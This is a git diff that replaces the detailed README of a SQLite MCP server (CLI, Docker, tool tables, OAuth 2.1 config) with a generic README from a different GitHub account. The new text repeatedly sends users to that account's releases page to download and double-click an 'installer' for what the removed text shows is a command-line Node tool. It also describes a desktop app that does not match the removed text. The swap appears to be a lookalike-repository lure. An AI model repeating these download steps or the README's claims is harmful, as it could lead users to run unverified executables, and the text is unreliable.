@@ -1,709 +1,90 @@
-# db-mcp
+# 🎉 db-mcp - Your Simple SQLite MCP Server
 
-Last Updated December 18, 2025
+## 🚀 Getting Started
 
-*Enterprise-grade SQLite MCP Server with OAuth 2.1 authentication & 89 specialized tools*
+Welcome to db-mcp! This application allows you to run an SQLite MCP server easily. It supports OAuth 2.0 for secure access, tool filtering for a better experience, and has options for both WASM and better-sqlite3 versions. Whether you're a developer or just looking for database tools, this software can help you manage your data effectively.
 
-> **Beta** - This project is actively being developed and is not yet ready for production use.
+## 📥 Download Now 
 
-[![GitHub](https://img.shields.io/badge/GitHub-neverinfamous/db--mcp-blue?logo=github)](https://github.com/neverinfamous/db-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![CodeQL](https://github.com/neverinfamous/db-mcp/actions/workflows/codeql.yml/badge.svg)](https://github.com/neverinfamous/db-mcp/actions/workflows/codeql.yml)
-![Version](https://img.shields.io/badge/version-0.1.0-green)
-![Status](https://img.shields.io/badge/status-Under%20Development-orange)
-[![Security](https://img.shields.io/badge/Security-Enhanced-green.svg)](SECURITY.md)
-![TypeScript](https://img.shields.io/badge/TypeScript-Strict-blue.svg)
+[![Download db-mcp](https://img.shields.io/badge/download-db--mcp-brightgreen)](https://github.com/ShootaOT/db-mcp/releases)
 
-A **SQLite MCP Server** with up to 89 tools, OAuth 2.1 authentication, and granular access control. Written in TypeScript.
+## 📋 System Requirements
 
-**[Wiki](https://github.com/neverinfamous/db-mcp/wiki)** • **[Changelog](CHANGELOG.md)** • **[Security](SECURITY.md)**
+Before you download, make sure your system meets these requirements:
 
----
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Node.js:** Version 14 or higher for the better-sqlite3 variant.
+- **Browser:** For the WASM variant, a modern browser is recommended.
+- **Internet Connection:** Required for downloading the application and OAuth setup.
 
-## 📋 Table of Contents
+## 🛠 Features
 
-### Quick Start
-- [✅ Quick Test - Verify Everything Works](#-quick-test---verify-everything-works)
-- [🚀 Quick Start](#-quick-start)
-- [⚡ Install to Cursor IDE](#-install-to-cursor-ide)
+db-mcp offers several features to enhance your database management:
 
-### Configuration & Usage
-- [📚 MCP Client Configuration](#-mcp-client-configuration)
-- [🎛️ Tool Filtering Presets](#️-tool-filtering-presets)
-- [🎨 Usage Examples](#-usage-examples)
-- [📊 Tool Categories](#-tool-categories)
+- **SQLite Server:** Manage your SQLite databases with ease.
+- **OAuth 2.0 Support:** Secure your application with industry-standard authentication.
+- **Tool Filtering:** Quickly find the tools you need for your projects.
+- **WASM and better-sqlite3 Options:** Choose the version that works best for you.
 
-### Features & Resources
-- [🔥 Core Capabilities](#-core-capabilities)
-- [🔐 OAuth 2.1 Implementation](#-oauth-20-implementation)
-- [🏆 Why Choose db-mcp?](#-why-choose-db-mcp)
-- [📈 Project Stats](#-project-stats)
+## 🏁 Download & Install
 
----
+To get started with db-mcp, follow these simple steps:
 
-## ✅ Quick Test - Verify Everything Works
+1. **Visit the Releases Page**  
+   Go to the [db-mcp Releases page](https://github.com/ShootaOT/db-mcp/releases).
 
-**Test the server in 30 seconds!**
+2. **Select Your Version**  
+   Choose the version that suits your needs. For most users, we recommend picking the latest release.
 
-Build and run:
-```bash
-npm run build
-node dist/cli.js --transport stdio --sqlite-native :memory:
-```
+3. **Download the File**  
+   Click on the appropriate file for your operating system. Look for the files labeled for 'better-sqlite3' or 'WASM'.
 
-Expected output:
-```
-[db-mcp] Starting MCP server...
-[db-mcp] Registered adapter: Native SQLite Adapter (better-sqlite3) (sqlite:default)
-[db-mcp] Server started successfully
-```
+4. **Run the Installer**  
+   Locate the downloaded file in your downloads folder and double-click to run the installer.
 
-Run the test suite:
-```bash
-npm run test
-```
+5. **Follow Setup Instructions**  
+   Complete the on-screen prompts to finish the installation. 
 
-### 🛡️ Security Features
+6. **Launch the Application**  
+   After installation, open db-mcp from your applications menu or desktop shortcut.
 
-- ✅ **SQL Injection Prevention** - Parameter binding on all queries
-- ✅ **OAuth 2.1 Authentication** - RFC 9728/8414 compliant
-- ✅ **Scope-based Authorization** - Granular read/write/admin access
-- ✅ **Strict TypeScript** - Full type safety with no `any` types
+## 🔍 Configuration
 
-[⬆️ Back to Table of Contents](#-table-of-contents)
+Once db-mcp is up and running, you may want to configure it for your specific needs:
 
----
+1. **OAuth 2.0 Setup**  
+   - Navigate to the settings section of the application.
+   - Follow the prompts to set up OAuth 2.0 for secure access.
 
-## 🚀 Quick Start
+2. **Database Connections**  
+   - Add your SQLite database files through the interface.
+   - Use the provided tools to filter and manage your data effectively.
 
-### Option 1: Docker (Recommended)
+3. **Explore Features**  
+   - Take some time to explore the available features.
+   - Use the documentation within the app for further guidance on handling your databases.
 
-Pull and run instantly:
-```bash
-docker pull writenotenow/db-mcp:latest
-```
+## 🔗 Helpful Links
 
-Run with volume mount:
-```bash
-docker run -i --rm \
-  -v $(pwd):/workspace \
-  writenotenow/db-mcp:latest \
-  --sqlite-native /workspace/database.db
-```
+- Documentation: [db-mcp Documentation](https://github.com/ShootaOT/db-mcp/wiki)
+- Support: If you encounter issues, please check the [issues section](https://github.com/ShootaOT/db-mcp/issues) for solutions or to report new problems.
 
-### Option 2: Node.js Installation
+## 🏗 Community
 
-Clone the repository:
-```bash
-git clone https://github.com/neverinfamous/db-mcp.git
-```
+Join our growing community to share your experiences, ask questions, and learn from others who are using db-mcp:
 
-Navigate to directory:
-```bash
-cd db-mcp
-```
-
-Install dependencies:
-```bash
-npm install
-```
-
-Build the project:
-```bash
-npm run build
-```
-
-Run the server:
-```bash
-node dist/cli.js --transport stdio --sqlite-native ./database.db
-```
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## ⚡ Install to Cursor IDE
-
-### One-Click Installation
-
-Click the button below to install directly into Cursor:
-
-[![Install to Cursor](https://img.shields.io/badge/Install%20to%20Cursor-Click%20Here-blue?style=for-the-badge)](cursor://anysphere.cursor-deeplink/mcp/install?name=db-mcp-sqlite&config=eyJkYi1tY3Atc3FsaXRlIjp7ImFyZ3MiOlsicnVuIiwiLWkiLCItLXJtIiwiLXYiLCIkKHB3ZCk6L3dvcmtzcGFjZSIsIndyaXRlbm90ZW5vdy9kYi1tY3A6bGF0ZXN0IiwiLS1zcWxpdGUtbmF0aXZlIiwiL3dvcmtzcGFjZS9kYXRhYmFzZS5kYiJdLCJjb21tYW5kIjoiZG9ja2VyIn19)
-
-Or copy this deep link:
-```
-cursor://anysphere.cursor-deeplink/mcp/install?name=db-mcp-sqlite&config=eyJkYi1tY3Atc3FsaXRlIjp7ImFyZ3MiOlsicnVuIiwiLWkiLCItLXJtIiwiLXYiLCIkKHB3ZCk6L3dvcmtzcGFjZSIsIndyaXRlbm90ZW5vdy9kYi1tY3A6bGF0ZXN0IiwiLS1zcWxpdGUtbmF0aXZlIiwiL3dvcmtzcGFjZS9kYXRhYmFzZS5kYiJdLCJjb21tYW5kIjoiZG9ja2VyIn19
-```
-
-### Prerequisites
-- ✅ Docker installed and running (for Docker method)
-- ✅ Node.js 18+ (for local installation)
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 📊 Tool Categories
-
-| Category | WASM | Native | Description |
-|----------|------|--------|-------------|
-| Core Database | 8 | 8 | CRUD, schema, indexes, views |
-| JSON Helpers | 6 | 6 | Simplified JSON operations |
-| JSON Operations | 12 | 12 | Full JSON manipulation |
-| Text Processing | 8 | 8 | Regex, case, substring |
-| FTS5 Full-Text Search | 4 | 4 | Create, search, rebuild |
-| Statistical Analysis | 8 | 8 | Stats, percentiles, histograms |
-| Virtual Tables | 4 | 4 | Generate series |
-| Vector/Semantic | 11 | 11 | Embeddings, similarity search |
-| Geospatial | 7 | 7 | Distance, bounding box, clustering |
-| Admin | 4 | 4 | Vacuum, backup, analyze, optimize |
-| Transactions | — | 7 | Begin, commit, rollback, savepoints |
-| Window Functions | — | 6 | Row number, rank, lag/lead, running totals |
-| **Total** | **76** | **89** | |
-
-### SQLite Backend Options
-
-Choose between two SQLite backends based on your needs:
-
-| Feature | WASM (sql.js) | Native (better-sqlite3) |
-|---------|---------------|-------------------------|
-| **Tools Available** | 76 | **89** |
-| **Transactions** | ❌ | ✅ 7 tools |
-| **Window Functions** | ❌ | ✅ 6 tools |
-| **FTS5 Full-Text Search** | ⚠️ Limited | ✅ Full |
-| **JSON1 Extension** | ⚠️ Limited | ✅ Full |
-| **Cross-platform** | ✅ No compilation | Requires Node.js native build |
-| **In-memory DBs** | ✅ | ✅ |
-| **File-based DBs** | ✅ | ✅ |
-
-Transaction Tools (7) - Native Only
-
-| Tool | Description |
-|------|-------------|
-| `sqlite_transaction_begin` | Start transaction (deferred/immediate/exclusive mode) |
-| `sqlite_transaction_commit` | Commit current transaction |
-| `sqlite_transaction_rollback` | Rollback current transaction |
-| `sqlite_transaction_savepoint` | Create a savepoint |
-| `sqlite_transaction_release` | Release a savepoint |
-| `sqlite_transaction_rollback_to` | Rollback to a savepoint |
-| `sqlite_transaction_execute` | Execute multiple statements atomically |
-
-Window Function Tools (6) - Native Only
-
-| Tool | Description |
-|------|-------------|
-| `sqlite_window_row_number` | Assign sequential row numbers |
-| `sqlite_window_rank` | Calculate RANK/DENSE_RANK/PERCENT_RANK |
-| `sqlite_window_lag_lead` | Access previous or next row values |
-| `sqlite_window_running_total` | Calculate cumulative sums |
-| `sqlite_window_moving_avg` | Calculate rolling averages |
-| `sqlite_window_ntile` | Divide rows into N buckets (quartiles, deciles, etc.) |
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 📚 MCP Client Configuration
-
-### Cursor IDE
-
-```json
-{
-  "mcpServers": {
-    "db-mcp-sqlite": {
-      "command": "node",
-      "args": [
-        "C:/path/to/db-mcp/dist/cli.js",
-        "--transport", "stdio",
-        "--sqlite-native", "C:/path/to/your/database.db"
-      ]
-    }
-  }
-}
-```
-
-### Claude Desktop
-
-```json
-{
-  "mcpServers": {
-    "db-mcp-sqlite": {
-      "command": "node",
-      "args": [
-        "/path/to/db-mcp/dist/cli.js",
-        "--transport", "stdio",
-        "--sqlite-native", "/path/to/database.db"
-      ]
-    }
-  }
-}
-```
-
-### Docker with Claude Desktop
-
-```json
-{
-  "mcpServers": {
-    "db-mcp-sqlite": {
-      "command": "docker",
-      "args": [
-        "run", "-i", "--rm",
-        "-v", "/path/to/project:/workspace",
-        "writenotenow/db-mcp:latest",
-        "--sqlite-native", "/workspace/database.db"
-      ]
-    }
-  }
-}
-```
-
-### In-Memory Database
-
-Use `:memory:` for a temporary in-memory database:
-
-```json
-{
-  "args": ["--transport", "stdio", "--sqlite-native", ":memory:"]
-}
-```
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 🎛️ Tool Filtering Presets
-
-> [!IMPORTANT]
-> **AI-enabled IDEs like Cursor have tool limits.** With 89 tools in the native backend, you must use tool filtering to stay within limits. Choose a preset below based on your use case.
-
-### Tool Groups
-
-| Group | Tools | Description |
-|-------|-------|-------------|
-| `core` | 9 | Basic CRUD, schema, tables |
-| `json` | 11 | JSON operations |
-| `text` | 6 | Text processing (regex, fuzzy) |
-| `fts5` | 4 | Full-text search |
-| `stats` | 8 | Statistical analysis |
-| `performance` | 6 | Query analysis, optimization |
-| `vector` | 8 | Embeddings, similarity search |
-| `geo` | 7 | Geospatial operations |
-| `backup` | 4 | Database backup/restore |
-| `monitoring` | 5 | Health checks, resource usage |
-| `admin` | 10 | Vacuum, analyze, pragmas |
-| `transactions` | 7 | Transaction control (native only) |
-| `window` | 6 | Window functions (native only) |
-
-### Preset: Minimal (~35 tools) ⭐ Recommended for most users
-
-Core database operations with JSON and basic text. Best for general development.
-
-```json
-{
-  "mcpServers": {
-    "db-mcp-sqlite": {
-      "command": "node",
-      "args": [
-        "C:/path/to/db-mcp/dist/cli.js",
-        "--transport", "stdio",
-        "--sqlite-native", "C:/path/to/database.db",
-        "--tool-filter", "-stats,-vector,-geo,-backup,-monitoring,-transactions,-window"
-      ]
-    }
-  }
-}
-```
-
-### Preset: Analytics (~56 tools)
-
-Includes statistics, window functions, and text processing. For data analysis.
-
-```json
-{
-  "args": [
-    "--transport", "stdio",
-    "--sqlite-native", "C:/path/to/database.db",
-    "--tool-filter", "-vector,-geo,-backup,-monitoring"
-  ]
-}
-```
-
-### Preset: Search (~62 tools)
-
-Full-text search plus vector/semantic search capabilities.
-
-```json
-{
-  "args": [
-    "--transport", "stdio",
-    "--sqlite-native", "C:/path/to/database.db",
-    "--tool-filter", "-stats,-geo,-backup,-monitoring,-transactions,-window"
-  ]
-}
-```
-
-### Preset: Geospatial (~48 tools)
-
-Distance calculations, bounding boxes, and spatial queries.
-
-```json
-{
-  "args": [
-    "--transport", "stdio",
-    "--sqlite-native", "C:/path/to/database.db",
-    "--tool-filter", "-stats,-vector,-backup,-monitoring,-transactions,-window"
-  ]
-}
-```
-
-### Custom Filtering
-
-Create your own filter using the syntax:
-- `-group` — Disable all tools in a group
-- `-tool_name` — Disable a specific tool
-- `+tool_name` — Re-enable a tool after group disable
-
-```bash
-# Example: Disable vector and geo, but keep cosine_similarity
---tool-filter "-vector,-geo,+cosine_similarity"
-```
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 🎨 Usage Examples
-
-### Data Analysis Workflow
-
-1. Build the project:
-```bash
-npm run build
-```
-
-2. Start with your data:
-```bash
-node dist/cli.js --transport stdio --sqlite-native ./sales_data.db
-```
-
-3. Use with Claude/Cursor for:
-   - Statistical analysis of your datasets
-   - Text processing and pattern extraction
-   - Vector similarity search
-   - Geospatial analysis and mapping
-
-### JSON Operations
-
-```javascript
-// Insert JSON data
-sqlite_write_query({
-  query: "INSERT INTO products (metadata) VALUES (?)",
-  params: [JSON.stringify({ name: "Product", price: 29.99 })]
-})
-
-// Query JSON with path extraction
-sqlite_json_extract({
-  table: "products",
-  column: "metadata",
-  path: "$.price"
-})
-```
-
-### Vector/Semantic Search
-
-```javascript
-// Store embeddings
-sqlite_vector_store({
-  table: "documents",
-  id_column: "id",
-  embedding_column: "embedding",
-  id: 1,
-  embedding: [0.1, 0.2, 0.3, ...]
-})
-
-// Find similar items
-sqlite_vector_search({
-  table: "documents",
-  embedding_column: "embedding",
-  query_embedding: [0.15, 0.25, 0.35, ...],
-  top_k: 10
-})
-```
-
-### Full-Text Search (FTS5)
-
-```javascript
-// Create FTS5 index
-sqlite_fts_create({
-  table: "articles",
-  columns: ["title", "content"]
-})
-
-// Search with BM25 ranking
-sqlite_fts_search({
-  table: "articles",
-  query: "machine learning",
-  limit: 10
-})
-```
-
-### Statistical Analysis
-
-```javascript
-// Get descriptive statistics for a column
-sqlite_describe_stats({
-  table: "employees",
-  column: "salary"
-})
-// Returns: count, mean, std, min, 25%, 50%, 75%, max
-
-// Calculate percentiles
-sqlite_percentile({
-  table: "sales",
-  column: "revenue",
-  percentiles: [25, 50, 75, 90, 95, 99]
-})
-
-// Generate histogram
-sqlite_histogram({
-  table: "products",
-  column: "price",
-  bins: 10
-})
-```
-
-### Geospatial Operations
-
-```javascript
-// Calculate distance between two points (Haversine formula)
-sqlite_geo_distance({
-  lat1: 40.7128,
-  lon1: -74.0060,  // New York
-  lat2: 34.0522,
-  lon2: -118.2437  // Los Angeles
-})
-// Returns: distance in kilometers
-
-// Find locations within bounding box
-sqlite_geo_bounding_box({
-  table: "stores",
-  lat_column: "latitude",
-  lon_column: "longitude",
-  min_lat: 40.0,
-  max_lat: 41.0,
-  min_lon: -75.0,
-  max_lon: -73.0
-})
-
-// Cluster nearby points
-sqlite_geo_cluster({
-  table: "customers",
-  lat_column: "lat",
-  lon_column: "lon",
-  distance_km: 5
-})
-```
-
-### Window Functions (Native Only)
-
-```javascript
-// Add row numbers to query results
-sqlite_window_row_number({
-  table: "employees",
-  order_by: "hire_date",
-  partition_by: "department"
-})
-
-// Calculate rankings
-sqlite_window_rank({
-  table: "sales",
-  value_column: "revenue",
-  partition_by: "region",
-  rank_type: "dense_rank"  // or "rank", "percent_rank"
-})
-
-// Calculate running totals
-sqlite_window_running_total({
-  table: "transactions",
-  value_column: "amount",
-  order_by: "date",
-  partition_by: "account_id"
-})
-
-// Moving averages
-sqlite_window_moving_avg({
-  table: "stock_prices",
-  value_column: "close_price",
-  order_by: "date",
-  window_size: 7  // 7-day moving average
-})
-```
-
-### Transactions (Native Only)
-
-```javascript
-// Execute multiple statements atomically
-sqlite_transaction_execute({
-  statements: [
-    "UPDATE accounts SET balance = balance - 100 WHERE id = 1",
-    "UPDATE accounts SET balance = balance + 100 WHERE id = 2",
-    "INSERT INTO transfers (from_id, to_id, amount) VALUES (1, 2, 100)"
-  ]
-})
-// All statements succeed or all are rolled back
-
-// Manual transaction control with savepoints
-sqlite_transaction_begin({ mode: "immediate" })
-sqlite_transaction_savepoint({ name: "before_update" })
-// ... perform operations ...
-sqlite_transaction_rollback_to({ name: "before_update" })  // Undo if needed
-sqlite_transaction_commit()
-```
-
-### Text Processing
-
-```javascript
-// Regex pattern matching
-sqlite_regex_match({
-  table: "logs",
-  column: "message",
-  pattern: "ERROR:\\s+(\\w+)"
-})
-
-// Fuzzy search for misspellings
-sqlite_fuzzy_search({
-  table: "products",
-  column: "name",
-  query: "laptp",  // Misspelled "laptop"
-  threshold: 0.6
-})
-
-// Text similarity scoring
-sqlite_text_similarity({
-  text1: "machine learning",
-  text2: "deep learning",
-  algorithm: "levenshtein"  // or "jaro_winkler", "cosine"
-})
-```
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 🔥 Core Capabilities
-
-- 📊 **Statistical Analysis** - Descriptive stats, percentiles, time series analysis
-- 🔍 **Advanced Text Processing** - Regex, fuzzy matching, phonetic search, similarity
-- 🧠 **Vector/Semantic Search** - AI-native embeddings, cosine similarity, hybrid search
-- 🗺️ **Geospatial Operations** - Distance calculations, bounding boxes, spatial queries
-- 🔐 **Transaction Safety** - Full ACID compliance with savepoints (native backend)
-- 🎛️ **89 Specialized Tools** - Complete database administration and analytics suite
-
-### 🏢 Enterprise Features
-
-- 🔐 **OAuth 2.1 Authentication** - RFC 9728/8414 compliant token-based authentication
-- 🛡️ **Tool Filtering** - Control which database operations are exposed
-- 👥 **Access Control** - Granular scopes for read-only, write, and admin access
-- 🎯 **Full-Text Search (FTS5)** - Advanced search with BM25 ranking
-- ⚡ **Window Functions** - Row numbers, rankings, running totals, moving averages
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 🔐 OAuth 2.1 Implementation
-
-| Component | Status | Description |
-|-----------|--------|-------------|
-| Protected Resource Metadata | ✅ | RFC 9728 `/.well-known/oauth-protected-resource` |
-| Auth Server Discovery | ✅ | RFC 8414 metadata discovery with caching |
-| Token Validation | ✅ | JWT validation with JWKS support |
-| Scope Enforcement | ✅ | Granular `read`, `write`, `admin` scopes |
-| HTTP Transport | ✅ | Streamable HTTP with OAuth middleware |
-
-### Supported Scopes
-
-| Scope | Description |
-|-------|-------------|
-| `read` | Read-only access to all databases |
-| `write` | Read and write access to all databases |
-| `admin` | Full administrative access |
-| `db:{name}` | Access to specific database only |
-| `table:{db}:{table}` | Access to specific table only |
-
-### Keycloak Integration
-
-See [docs/KEYCLOAK_SETUP.md](docs/KEYCLOAK_SETUP.md) for setting up Keycloak as your OAuth provider.
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 🏆 Why Choose db-mcp?
-
-✅ **TypeScript Native** - Full type safety with strict mode, no `any` types  
-✅ **89 Specialized Tools** - Most comprehensive SQLite MCP server available  
-✅ **OAuth 2.1 Built-in** - Enterprise-grade authentication out of the box  
-✅ **Dual Backends** - WASM for portability, native for performance  
-✅ **Tool Filtering** - Stay within AI IDE tool limits with preset configurations  
-✅ **Window Functions** - Advanced analytics with ROW_NUMBER, RANK, LAG/LEAD  
-✅ **Transaction Support** - Full ACID compliance with savepoints  
-✅ **Modern Architecture** - Built on MCP SDK with clean, modular design  
-✅ **Active Development** - Regular updates and improvements
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## 📈 Project Stats
-
-- **89 Tools** in native backend (76 in WASM)
-- **13 Tool Groups** for flexible filtering
-- **Strict TypeScript** with full type coverage
-- **Multi-platform** support (Windows, Linux, macOS)
-- **Docker images** available for easy deployment
-- **OAuth 2.1** RFC-compliant authentication
-- **Active development** with regular updates
-
-[⬆️ Back to Table of Contents](#-table-of-contents)
-
----
-
-## Configuration
-
-### Environment Variables
-
-Copy `.env.example` to `.env` and configure:
-
-```bash
-KEYCLOAK_URL=http://localhost:8080
-KEYCLOAK_REALM=db-mcp
-KEYCLOAK_CLIENT_ID=db-mcp-server
-KEYCLOAK_CLIENT_SECRET=your_secret_here
-DBMCP_PORT=3000
-DBMCP_OAUTH_ENABLED=true
-```
-
-### JSON Configuration
-
-See `config/db-mcp.keycloak.json` for a complete example.
-
----
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting a pull request.
-
-## Security
-
-For security concerns, please see our [Security Policy](SECURITY.md).
-
-> **⚠️ Never commit credentials** - Store secrets in `.env` (gitignored)
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Code of Conduct
-
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before participating in this project.
+- GitHub Discussions: [Join Discussions](https://github.com/ShootaOT/db-mcp/discussions)
+
+## 📝 Contributing
+
+If you want to contribute to db-mcp, we welcome your input. Please review the guidelines in our repository and submit your pull requests.
+
+## 📊 License
+
+db-mcp is open-source software. You can use it for personal or commercial projects under the terms of the [MIT License](https://github.com/ShootaOT/db-mcp/blob/main/LICENSE).
+
+## 📥 Download Now Again
+
+Don't forget to download db-mcp to experience a better way to manage your SQLite databases.
+
+[![Download db-mcp](https://img.shields.io/badge/download-db--mcp-brightgreen)](https://github.com/ShootaOT/db-mcp/releases)
